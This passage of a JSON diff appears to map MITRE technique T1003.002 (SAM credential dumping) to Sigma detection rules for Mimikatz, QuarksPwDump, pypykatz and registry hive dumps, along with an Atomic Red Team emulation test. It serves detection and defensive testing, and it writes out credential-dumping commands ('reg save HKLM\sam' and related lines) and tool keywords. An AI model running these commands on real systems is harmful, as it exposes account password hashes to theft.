+                            "raw": "author: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim\n  Shelton\ndate: 2019/10/22\ndescription: Detection well-known mimikatz command line arguments\ndetection:\n  condition: ( selection_1 or (module_names and mimikatz_separator) or (function_names\n    and mimikatz_separator) ) and not 1 of filter*\n  filter_1:\n    CommandLine|contains: function Convert-GuidToCompressedGuid\n  filter_vscode:\n    CommandLine|contains|all:\n    - '/d /s /c '\n    - 'checkfilenameiocs --ioc-path '\n    ParentImage|endswith: \\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n  function_names:\n    CommandLine|contains:\n    - aadcookie\n    - detours\n    - memssp\n    - mflt\n    - ncroutemon\n    - ngcsign\n    - printnightmare\n    - skeleton\n    - preshutdown\n    - mstsc\n    - multirdp\n  mimikatz_separator:\n    CommandLine|contains: '::'\n  module_names:\n    CommandLine|contains:\n    - rpc\n    - token\n    - crypto\n    - dpapi\n    - sekurlsa\n    - kerberos\n    - lsadump\n    - privilege\n    - process\n    - vault\n  selection_1:\n    CommandLine|contains:\n    - DumpCreds\n    - invoke-mimikatz\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/07\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\ntitle: Mimikatz Command Line\n",
+                            "sigma:id": "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                            "title": "Mimikatz Command Line",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "847def9e-924d-4e90-b7c4-5f581395a2b4",
+                        "lookup_data": {
+                            "description": "Detects a dump file written by QuarksPwDump password dumper",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/02/10\ndescription: Detects a dump file written by QuarksPwDump password dumper\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains|all:\n    - \\AppData\\Local\\Temp\\SAM-\n    - .dmp\nfalsepositives:\n- Unknown\nid: 847def9e-924d-4e90-b7c4-5f581395a2b4\nlevel: critical\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: QuarksPwDump Dump File\n",
+                            "sigma:id": "847def9e-924d-4e90-b7c4-5f581395a2b4",
+                            "title": "QuarksPwDump Dump File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1af57a4b-460a-4738-9034-db68b880c665",
+                        "lookup_data": {
+                            "description": "Detects suspicious PowerShell scripts accessing SAM hives",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/07/29\ndescription: Detects suspicious PowerShell scripts accessing SAM hives\ndetection:\n  condition: all of selection*\n  selection_1:\n    CommandLine|contains|all:\n    - \\HarddiskVolumeShadowCopy\n    - System32\\config\\sam\n  selection_2:\n    CommandLine|contains:\n    - Copy-Item\n    - cp $_.\n    - cpi $_.\n    - copy $_.\n    - .File]::Copy(\nfalsepositives:\n- Some rare backup scenarios\n- PowerShell scripts fixing HiveNightmare / SeriousSAM ACLs\nid: 1af57a4b-460a-4738-9034-db68b880c665\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://twitter.com/splinter_code/status/1420546784250769408\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: PowerShell SAM Copy\n",
+                            "sigma:id": "1af57a4b-460a-4738-9034-db68b880c665",
+                            "title": "PowerShell SAM Copy",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                        "lookup_data": {
+                            "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)",
+                            "raw": "author: Florian Roth (Nextron Systems), David ANDRE (additional keywords)\ndate: 2017/01/10\ndescription: This method detects mimikatz keywords in different Eventlogs (some of\n  them only appear in older Mimikatz version that are however still used by different\n  threat groups)\ndetection:\n  condition: keywords and not filter\n  filter:\n    EventID: 15\n  keywords:\n  - dpapi::masterkey\n  - eo.oe.kiwi\n  - event::clear\n  - event::drop\n  - gentilkiwi.com\n  - kerberos::golden\n  - kerberos::ptc\n  - kerberos::ptt\n  - kerberos::tgt\n  - Kiwi Legit Printer\n  - 'lsadump::'\n  - mimidrv.sys\n  - \\mimilib.dll\n  - misc::printnightmare\n  - misc::shadowcopies\n  - misc::skeleton\n  - privilege::backup\n  - privilege::debug\n  - privilege::driver\n  - 'sekurlsa::'\nfalsepositives:\n- Naughty administrators\n- AV Signature updates\n- Files with Mimikatz in their filename\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\nlevel: high\nlogsource:\n  product: windows\nmodified: 2022/01/05\nreferences:\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.s0002\n- attack.lateral_movement\n- attack.credential_access\n- car.2013-07-001\n- car.2019-04-004\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.001\n- attack.t1003.006\ntitle: Mimikatz Use\n",
+                            "sigma:id": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
+                            "title": "Mimikatz Use",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "39f919f3-980b-4e6f-a975-8af7e507ef2b",
+                        "lookup_data": {
+                            "description": "Detects QuarksPwDump clearing access history in hive",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/05/15\ndescription: Detects QuarksPwDump clearing access history in hive\ndetection:\n  condition: selection\n  selection:\n    EventID: 16\n    HiveName|contains: \\AppData\\Local\\Temp\\SAM\n    HiveName|endswith: .dmp\n    Provider_Name: Microsoft-Windows-Kernel-General\nfalsepositives:\n- Unknown\nid: 39f919f3-980b-4e6f-a975-8af7e507ef2b\nlevel: critical\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/04/14\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: QuarksPwDump Clearing Access History\n",
+                            "sigma:id": "39f919f3-980b-4e6f-a975-8af7e507ef2b",
+                            "title": "QuarksPwDump Clearing Access History",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0685b176-c816-4837-8e7b-1216f346636b",
+                        "lookup_data": {
+                            "description": "Detects usage of the Quarks PwDump tool via commandline arguments",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/05\ndescription: Detects usage of the Quarks PwDump tool via commandline arguments\ndetection:\n  condition: 1 of selection_*\n  selection_cli:\n    CommandLine:\n    - ' -dhl'\n    - ' --dump-hash-local'\n    - ' -dhdc'\n    - ' --dump-hash-domain-cached'\n    - ' --dump-bitlocker'\n    - ' -dhd '\n    - ' --dump-hash-domain '\n    - --ntds-file\n  selection_img:\n    Image|endswith: \\QuarksPwDump.exe\nfalsepositives:\n- Unlikely\nid: 0685b176-c816-4837-8e7b-1216f346636b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/quarkslab/quarkspwdump\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-apt-iran-middle-east\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Quarks PwDump Usage\n",
+                            "sigma:id": "0685b176-c816-4837-8e7b-1216f346636b",
+                            "title": "Quarks PwDump Usage",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - System\n",
+                            "sigma:id": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                            "title": "Credential Dumping Tools Service Execution - System",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via specific named pipes",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Detects well-known credential dumping tools execution via specific named\n  pipes\ndetection:\n  condition: selection\n  selection:\n    PipeName|contains:\n    - \\lsadump\n    - \\cachedump\n    - \\wceservicepipe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump-Tools Named Pipes\n",
+                            "sigma:id": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                            "title": "Cred Dump-Tools Named Pipes",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: f0d1feba-4344-4ca9-8121-a6c97bd6df52\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - Security\n",
+                            "sigma:id": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                            "title": "Credential Dumping Tools Service Execution - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a29808fd-ef50-49ff-9c7a-59a9b040b404",
+                        "lookup_data": {
+                            "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored",
+                            "raw": "author: frack113\ndate: 2022/01/05\ndescription: Adversaries may attempt to extract credential material from the Security\n  Account Manager (SAM) database either through Windows Registry where the SAM database\n  is stored\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - live\n    - registry\n    Image|endswith:\n    - \\pypykatz.exe\n    - \\python.exe\nfalsepositives:\n- Unknown\nid: a29808fd-ef50-49ff-9c7a-59a9b040b404\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/skelsec/pypykatz\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-2---registry-parse-with-pypykatz\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Registry Parse with Pypykatz\n",
+                            "sigma:id": "a29808fd-ef50-49ff-9c7a-59a9b040b404",
+                            "title": "Registry Parse with Pypykatz",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "11b1ed55-154d-4e82-8ad7-83739298f720",
+                        "lookup_data": {
+                            "description": "Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/11\ndescription: Detects suspicious processes that write (copy) a Active Directory database\n  (ntds.dit) file\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\mshta.exe\n    - \\wsl.exe\n    TargetFilename|endswith: \\ntds.dit\nfalsepositives:\n- Unknown\nid: 11b1ed55-154d-4e82-8ad7-83739298f720\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/\n- https://adsecurity.org/?p=2398\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.003\ntitle: Suspicious Process Writes Ntds.dit\n",
+                            "sigma:id": "11b1ed55-154d-4e82-8ad7-83739298f720",
+                            "title": "Suspicious Process Writes Ntds.dit",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1644e709-12d2-41e5-a60f-3470991f5011",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1003.002",
+                            "mitre-cti:description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
+                            "mitre-cti:name": "Security Account Manager",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ed Williams, Trustwave, SpiderLabs'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011', 'created': '2020-02-11T18:42:07.281Z', 'x_mitre_version': '1.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1003.002', 'url': 'https://attack.mitre.org/techniques/T1003/002'}, {'source_name': 'GitHub Creddump7', 'url': 'https://github.com/Neohapsis/creddump7', 'description': 'Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\\n\\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\\n\\n* pwdumpx.exe\\n* [gsecdump](https://attack.mitre.org/software/S0008)\\n* [Mimikatz](https://attack.mitre.org/software/S0002)\\n* secretsdump.py\\n\\nAlternatively, the SAM can be extracted from the Registry with Reg:\\n\\n* <code>reg save HKLM\\\\sam sam</code>\\n* <code>reg save HKLM\\\\system system</code>\\n\\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\\n\\nNotes: \\n\\n* RID 500 account is the local, built-in administrator.\\n* RID 501 is the guest account.\\n* User accounts start with a RID of 1,000+.\\n', 'modified': '2022-06-15T16:17:19.049Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Security Account Manager', 'x_mitre_detection': 'Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Windows Registry: Windows Registry Key Access', 'File: File Access', 'Command: Command Execution'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL",
+                            "raw": "author: Samir Bousseaden, wagga\ndate: 2019/04/03\ndescription: Detect AD credential dumping using impacket secretdump HKTL\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    RelativeTargetName|contains|all:\n    - SYSTEM32\\\n    - .tmp\n    ShareName: \\\\\\\\\\*\\\\ADMIN$\nfalsepositives:\n- Unknown\nid: 252902e3-5830-4cf6-bf21-c22083dfd5cf\nlevel: high\nlogsource:\n  definition: The advanced audit policy setting \"Object Access > Audit Detailed File\n    Share\" must be configured for Success/Failure\n  product: windows\n  service: security\nmodified: 2022/08/11\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity\n",
+                            "sigma:id": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                            "title": "Possible Impacket SecretDump Remote Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e",
+                        "lookup_data": {
+                            "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through Windows Registry where the SAM database is stored",
+                            "raw": "author: frack113\ndate: 2022/01/05\ndescription: Adversaries may attempt to extract credential material from the Security\n  Account Manager (SAM) database either through Windows Registry where the SAM database\n  is stored\ndetection:\n  condition: all of selection_*\n  selection_key:\n    CommandLine|contains:\n    - HKLM\\sam\n    - HKLM\\system\n    - HKLM\\security\n  selection_reg:\n    CommandLine|contains: ' save '\nfalsepositives:\n- Unknown\nid: 038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-1---registry-dump-of-sam-creds-and-secrets\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Registry Dump of SAM Creds and Secrets\n",
+                            "sigma:id": "038cd51c-3ad8-41c5-ba8f-5d1c92f3cc1e",
+                            "title": "Registry Dump of SAM Creds and Secrets",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                        "lookup_data": {
+                            "description": "Shadow Copies creation using operating systems utilities, possible credential access",
+                            "raw": "author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Shadow Copies creation using operating systems utilities, possible credential\n  access\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - shadow\n    - create\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wmic.exe\n    - \\vssadmin.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n    - wmic.exe\n    - VSSADMIN.EXE\nfalsepositives:\n- Legitimate administrator working with shadow copies, access for backup purposes\nid: b17ea6f7-6e90-447e-a799-e6c0a493d6ce\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/10\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1003.002\n- attack.t1003.003\ntitle: Shadow Copies Creation Using Operating Systems Utilities\n",
+                            "sigma:id": "b17ea6f7-6e90-447e-a799-e6c0a493d6ce",
+                            "title": "Shadow Copies Creation Using Operating Systems Utilities",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                        "lookup_data": {
+                            "description": "Dump sam, system or security hives using REG.exe utility",
+                            "raw": "author: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Dump sam, system or security hives using REG.exe utility\ndetection:\n  condition: all of selection_*\n  selection_1:\n    CommandLine|contains:\n    - save\n    - export\n    - \"\\u02E2ave\"\n    - \"e\\u02E3port\"\n    Image|endswith: \\reg.exe\n  selection_2:\n    CommandLine|contains:\n    - hklm\n    - \"hk\\u02EAm\"\n    - hkey_local_machine\n    - \"hkey_\\u02EAocal_machine\"\n    - \"hkey_loca\\u02EA_machine\"\n    - \"hkey_\\u02EAoca\\u02EA_machine\"\n  selection_3:\n    CommandLine|endswith:\n    - \\system\n    - \\sam\n    - \\security\n    - \"\\\\\\u02E2ystem\"\n    - \"\\\\sy\\u02E2tem\"\n    - \"\\\\\\u02E2y\\u02E2tem\"\n    - \"\\\\\\u02E2am\"\n    - \"\\\\\\u02E2ecurity\"\nfalsepositives:\n- Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nid: fd877b94-9bb5-4191-bb25-d79cbd93c167\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003/T1003.md\n- https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- car.2013-07-001\ntitle: Grabbing Sensitive Hives via Reg Utility\n",
+                            "sigma:id": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                            "title": "Grabbing Sensitive Hives via Reg Utility",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f512acbf-e662-4903-843e-97ce4652b740",
+                        "lookup_data": {
+                            "description": "Detects volume shadow copy mount via windows event log",
+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR)\ndate: 2020/10/20\ndescription: Detects volume shadow copy mount via windows event log\ndetection:\n  condition: selection\n  selection:\n    DeviceName|contains: HarddiskVolumeShadowCopy\n    EventID: 98\n    Provider_Name: Microsoft-Windows-Ntfs\nfalsepositives:\n- Legitimate use of volume shadow copy mounts (backups maybe).\nid: f512acbf-e662-4903-843e-97ce4652b740\nlevel: low\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: Volume Shadow Copy Mount\n",
+                            "sigma:id": "f512acbf-e662-4903-843e-97ce4652b740",
+                            "title": "Volume Shadow Copy Mount",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                        "lookup_data": {
+                            "description": "Files with well-known filenames (parts of credential dump software or files produced by them) creation",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Files with well-known filenames (parts of credential dump software or\n  files produced by them) creation\ndetection:\n  condition: selection\n  selection:\n  - TargetFilename|contains:\n    - \\pwdump\n    - \\kirbi\n    - \\pwhashes\n    - \\wce_ccache\n    - \\wce_krbtkts\n    - \\fgdump-log\n  - TargetFilename|endswith:\n    - \\test.pwd\n    - \\lsremora64.dll\n    - \\lsremora.dll\n    - \\fgexec.exe\n    - \\wceaux.dll\n    - \\SAM.out\n    - \\SECURITY.out\n    - \\SYSTEM.out\n    - \\NTDS.out\n    - \\DumpExt.dll\n    - \\DumpSvc.exe\n    - \\cachedump64.exe\n    - \\cachedump.exe\n    - \\pstgdump.exe\n    - \\servpw.exe\n    - \\servpw64.exe\n    - \\pwdump.exe\n    - \\procdump64.exe\n    - \\Dumpy.exe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 8fbf3271-1ef6-4e94-8210-03c2317947f6\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.003\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump Tools Dropped Files\n",
+                            "sigma:id": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                            "title": "Cred Dump Tools Dropped Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e9faba72-4974-4ab2-a4c5-46e25ad59e9b",
+                        "lookup_data": {
+                            "description": "Detects the registration of the security event source VSSAudit. It would usually trigger when volume shadow copy operations happen.",
+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g, Open Threat Research (OTR)\ndate: 2020/10/20\ndescription: Detects the registration of the security event source VSSAudit. It would\n  usually trigger when volume shadow copy operations happen.\ndetection:\n  condition: selection\n  selection:\n    AuditSourceName: VSSAudit\n    EventID:\n    - 4904\n    - 4905\n    Provider_Name: Microsoft-Windows-Security-Auditing\nfalsepositives:\n- Legitimate use of VSSVC. Maybe backup operations. It would usually be done by C:\\Windows\\System32\\VSSVC.exe.\nid: e9faba72-4974-4ab2-a4c5-46e25ad59e9b\nlevel: informational\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/04/28\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\ntitle: VSSAudit Security Event Source Registration\n",
+                            "sigma:id": "e9faba72-4974-4ab2-a4c5-46e25ad59e9b",
+                            "title": "VSSAudit Security Event Source Registration",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1003.002",
+                "display_name": "OS Credential Dumping: Security Account Manager",
+                "atomic_tests": [
+                    {
+                        "name": "Registry dump of SAM, creds, and secrets",
+                        "auto_generated_guid": "5c2571d0-1572-416d-9676-812e64ca9f44",
+                        "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
+                            "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
